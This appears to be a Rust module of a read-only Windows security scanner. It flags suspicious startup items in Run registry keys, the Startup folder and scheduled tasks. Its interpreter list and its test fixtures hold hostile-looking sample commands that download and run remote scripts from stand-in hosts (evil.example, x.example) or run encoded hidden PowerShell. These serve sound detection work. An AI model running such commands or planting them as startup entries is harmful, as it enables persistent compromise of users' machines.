//! Things that start automatically on Windows: Run/RunOnce registry values,
//! the Startup folder and scheduled tasks. Read-only.

use std::path::{Path, PathBuf};

use super::{patterns, read_small, Area, Finding, Severity};
use crate::env::Env;
use crate::fsutil::command;

/// Programs that run scripts: fine for apps to call, odd as a startup item.
const INTERPRETERS: &[&str] = &[
    "powershell.exe",
    "pwsh.exe",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
    "cmd.exe",
    "node.exe",
    "python.exe",
    "pythonw.exe",
    "rundll32.exe",
    "regsvr32.exe",
    "bun.exe",
    "deno.exe",
];

const SCRIPT_EXTS: &[&str] = &["bat", "cmd", "vbs", "vbe", "js", "jse", "ps1", "wsf", "hta"];

const RUN_KEYS: &[(&str, bool)] = &[
    (r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", false),
    (r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce", false),
    (r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run", true),
    (r"HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce", true),
    (r"HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run", true),
];

/// `reg query` output → (value name, data). Lines look like
/// `    OneDrive    REG_SZ    "C:\...\OneDrive.exe" /background`.
pub fn parse_reg_query(out: &str) -> Vec<(String, String)> {
    out.lines()
        .filter(|l| l.starts_with("    "))
        .filter_map(|l| {
            let l = l.trim_start();
            let (name, rest) = l.split_once("    REG_")?;
            let (_, data) = rest.split_once("    ").unwrap_or((rest, ""));
            Some((name.trim().to_string(), data.trim().to_string()))
        })
        .collect()
}

/// Split a Windows command line into the program and the rest.
pub fn split_command(cmd: &str) -> (String, String) {
    let cmd = cmd.trim();
    if let Some(rest) = cmd.strip_prefix('"') {
        if let Some((prog, args)) = rest.split_once('"') {
            return (prog.to_string(), args.trim().to_string());
        }
    }
    let lower = cmd.to_ascii_lowercase();
    if let Some(i) = lower.find(".exe") {
        let end = i + 4;
        return (cmd[..end].to_string(), cmd[end..].trim().to_string());
    }
    match cmd.split_once(' ') {
        Some((p, a)) => (p.to_string(), a.trim().to_string()),
        None => (cmd.to_string(), String::new()),
    }
}

fn file_name_lower(p: &str) -> String {
    p.rsplit(['\\', '/']).next().unwrap_or(p).to_ascii_lowercase()
}

/// A path in a temporary, shared or hidden folder, where installers never put programs.
fn looks_hidden(s: &str) -> bool {
    let l = s.to_ascii_lowercase().replace('/', "\\");
    l.contains("\\appdata\\local\\temp\\")
        || l.contains("%temp%")
        || l.contains("\\users\\public\\")
        || (l.contains("\\programdata\\") && SCRIPT_EXTS.iter().any(|e| l.contains(&format!(".{e}"))))
        || l.split('\\')
            .any(|c| c.starts_with('.') && c.len() > 1 && !c.starts_with(".."))
}

fn trusted(prog: &str) -> bool {
    let l = prog.to_ascii_lowercase();
    [
        "c:\\program files\\",
        "c:\\program files (x86)\\",
        "c:\\windows\\",
        "%programfiles%",
        "%windir%",
        "%systemroot%",
    ]
    .iter()
    .any(|p| l.starts_with(p))
}

/// Judge one startup command. `system` items (all users) that look normal are
/// skipped; the user's own are listed as Info so you can see what starts.
pub fn judge(label: &str, cmdline: &str, system: bool) -> Option<Finding> {
    let (prog, args) = split_command(cmdline);
    let exe = file_name_lower(&prog);
    let interp = INTERPRETERS.contains(&exe.as_str());
    let hits = patterns::scan_text(cmdline);
    let hidden = looks_hidden(&prog) || looks_hidden(&args);
    let script_arg = SCRIPT_EXTS
        .iter()
        .any(|e| args.to_ascii_lowercase().contains(&format!(".{e}")));
    let missing = prog.contains(":\\") && !prog.contains('%') && !Path::new(&prog).exists();

    let (sev, why) = if patterns::worst(&hits) == Some(Severity::High) {
        (Severity::High, hits[0].reason.to_string())
    } else if interp && (hidden || script_arg && cmdline.to_ascii_lowercase().contains("\\appdata\\")) {
        (
            Severity::High,
            format!("runs {exe} on a script in a hidden or temporary folder"),
        )
    } else if hidden {
        (
            Severity::Medium,
            "runs a program from a hidden or temporary folder".to_string(),
        )
    } else if interp {
        (
            Severity::Medium,
            format!("starts a {exe} script when you sign in — unusual for normal apps"),
        )
    } else if let Some(h) = hits.first() {
        (h.severity, h.reason.to_string())
    } else if missing {
        (
            Severity::Low,
            "points to a program that no longer exists (left over from an uninstalled app)".to_string(),
        )
    } else if system || trusted(&prog) {
        return None;
    } else {
        (Severity::Info, "starts automatically when you sign in".to_string())
    };
    let title = match sev {
        Severity::Info => format!("Startup item: {label}"),
        Severity::Low => format!("Leftover startup item: {label}"),
        _ => format!("Suspicious startup item: {label}"),
    };
    Some(Finding::new(sev, Area::Startup, title, format!("This item {why}.")).evidence(patterns::excerpt(cmdline)))
}

fn run_keys() -> Vec<Finding> {
    let mut out = Vec::new();
    for (key, system) in RUN_KEYS {
        let Ok(o) = command("reg").args(["query", key]).output() else {
            continue;
        };
        for (name, data) in parse_reg_query(&String::from_utf8_lossy(&o.stdout)) {
            if let Some(mut f) = judge(&name, &data, *system) {
                f.advice = Some(format!(
                    "If you don't recognise it, turn it off in Task Manager → Startup apps, or delete \"{name}\" under {key} in Registry Editor."
                ));
                out.push(f);
            }
        }
    }
    out
}

fn startup_folder(env: &Env) -> Vec<Finding> {
    let Some(appdata) = env.app_data.clone() else {
        return vec![];
    };
    let dir = appdata
        .join("Microsoft")
        .join("Windows")
        .join("Start Menu")
        .join("Programs")
        .join("Startup");
    let Ok(rd) = std::fs::read_dir(&dir) else { return vec![] };
    let mut out = Vec::new();
    for e in rd.flatten() {
        let path = e.path();
        let name = e.file_name().to_string_lossy().to_string();
        let ext = path
            .extension()
            .map(|x| x.to_string_lossy().to_ascii_lowercase())
            .unwrap_or_default();
        if name.eq_ignore_ascii_case("desktop.ini") {
            continue;
        }
        let mut f = if SCRIPT_EXTS.contains(&ext.as_str()) {
            let text = read_small(&path, 512 * 1024).unwrap_or_default();
            let hits = patterns::scan_text(&text);
            let (sev, why) = match hits.first() {
                Some(h) => (
                    patterns::worst(&hits).unwrap_or(Severity::Medium).max(Severity::Medium),
                    h.reason.to_string(),
                ),
                None => (
                    Severity::Medium,
                    format!("is a .{ext} script that runs when you sign in"),
                ),
            };
            let mut f = Finding::new(
                sev,
                Area::Startup,
                format!("Startup script: {name}"),
                format!("This file {why}."),
            );
            if let Some(line) = text.lines().find(|l| !patterns::scan_text(l).is_empty()) {
                f = f.evidence(patterns::excerpt(line));
            }
            f
        } else {
            Finding::new(
                Severity::Info,
                Area::Startup,
                format!("Startup item: {name}"),
                "This starts when you sign in.",
            )
        };
        f = f.path(&path);
        if f.severity >= Severity::Low {
            f = f.quarantinable();
        }
        out.push(f);
    }
    out
}

/// `path<TAB>command` lines from PowerShell, for tasks outside \Microsoft\.
pub fn parse_tasks(out: &str) -> Vec<(String, String)> {
    out.lines()
        .filter_map(|l| l.split_once('\t'))
        .map(|(n, c)| (n.trim().to_string(), c.trim().to_string()))
        .filter(|(n, c)| !n.is_empty() && !c.is_empty())
        .collect()
}

fn scheduled_tasks() -> Vec<Finding> {
    const SCRIPT: &str = "Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\\Microsoft\\*' } | ForEach-Object { \
        $a = ($_.Actions | Where-Object { $_.Execute } | ForEach-Object { \"$($_.Execute) $($_.Arguments)\" }) -join ' ; '; \
        \"$($_.TaskPath)$($_.TaskName)`t$a\" }";
    let Ok(o) = command("powershell")
        .args(["-NoProfile", "-NonInteractive", "-Command", SCRIPT])
        .output()
    else {
        return vec![];
    };
    parse_tasks(&String::from_utf8_lossy(&o.stdout))
        .into_iter()
        .filter_map(|(name, cmd)| {
            // Scheduled tasks are mostly vendor updaters: only report the unusual ones.
            let f = judge(&name, &cmd, true)?;
            Some(Finding {
                title: f.title.replace("Startup item", "Scheduled task"),
                advice: Some(format!(
                    "If you don't recognise it, open Task Scheduler and delete \"{name}\"."
                )),
                ..f
            })
        })
        .collect()
}

pub fn scan(env: &Env) -> Vec<Finding> {
    let mut out = startup_folder(env);
    if cfg!(windows) && env.home.starts_with(dirs_home()) {
        out.extend(run_keys());
        out.extend(scheduled_tasks());
    }
    out
}

/// The real home folder, so sandboxed test homes never read this machine's registry.
fn dirs_home() -> PathBuf {
    dirs::home_dir().unwrap_or_default()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_registry_and_tasks() {
        let reg = "\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n    OneDrive    REG_SZ    \"C:\\Users\\me\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background\r\n    Updater    REG_EXPAND_SZ    powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\r\n\r\n";
        let v = parse_reg_query(reg);
        assert_eq!(v.len(), 2);
        assert_eq!(v[0].0, "OneDrive");
        assert!(v[0].1.ends_with("/background"));
        assert!(v[1].1.starts_with("powershell.exe"));

        let t = parse_tasks("\\MyTask\tC:\\Tools\\sync.exe --quiet\r\n\\Empty\t\r\n");
        assert_eq!(
            t,
            vec![("\\MyTask".to_string(), "C:\\Tools\\sync.exe --quiet".to_string())]
        );
    }

    #[test]
    fn splits_command_lines() {
        assert_eq!(
            split_command("\"C:\\Program Files\\App\\app.exe\" --min").0,
            "C:\\Program Files\\App\\app.exe"
        );
        assert_eq!(
            split_command("C:\\Windows\\system32\\rundll32.exe shell32.dll,Foo").0,
            "C:\\Windows\\system32\\rundll32.exe"
        );
        assert_eq!(split_command("wscript.exe //B C:\\x.vbs").1, "//B C:\\x.vbs");
    }

    #[test]
    fn judges_windows_startup_items() {
        let enc = judge(
            "Updater",
            "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
            false,
        )
        .unwrap();
        assert_eq!(enc.severity, Severity::High);
        let dl = judge("x", "powershell -c \"irm https://evil.example/a.ps1 | iex\"", false).unwrap();
        assert_eq!(dl.severity, Severity::High);
        let vbs = judge("y", "wscript.exe C:\\Users\\me\\AppData\\Roaming\\svc\\run.vbs", false).unwrap();
        assert_eq!(vbs.severity, Severity::High);
        let temp = judge("z", "C:\\Users\\me\\AppData\\Local\\Temp\\upd.exe", false).unwrap();
        assert_eq!(temp.severity, Severity::Medium);
        let normal = judge(
            "OneDrive",
            // `%ProgramFiles%` so the test doesn't depend on the file existing here.
            "\"%ProgramFiles%\\Microsoft OneDrive\\OneDrive.exe\" /background",
            false,
        );
        assert!(normal.is_none(), "installed programs are fine");
        let own = judge("Tool", "\"D:\\Apps\\tool.exe\"", false).unwrap();
        assert!(matches!(own.severity, Severity::Info | Severity::Low));
        assert!(judge("Vendor", "\"D:\\Apps\\tool.exe\"", true).is_none_or(|f| f.severity >= Severity::Low));
    }

    #[test]
    fn startup_folder_scripts_are_flagged() {
        let d = tempfile::tempdir().unwrap();
        let env = Env::sandboxed(d.path(), crate::env::Os::Windows);
        let dir = env
            .app_data
            .clone()
            .unwrap()
            .join("Microsoft/Windows/Start Menu/Programs/Startup");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("update.vbs"),
            "CreateObject(\"WScript.Shell\").Run \"mshta https://x.example/a.hta\"",
        )
        .unwrap();
        std::fs::write(dir.join("Spotify.lnk"), "x").unwrap();
        std::fs::write(dir.join("desktop.ini"), "x").unwrap();
        let f = startup_folder(&env);
        assert_eq!(f.len(), 2);
        let vbs = f.iter().find(|f| f.title.contains("update.vbs")).unwrap();
        assert_eq!(vbs.severity, Severity::High);
        assert!(vbs.can_quarantine);
        let lnk = f.iter().find(|f| f.title.contains("Spotify")).unwrap();
        assert_eq!(lnk.severity, Severity::Info);
    }
}
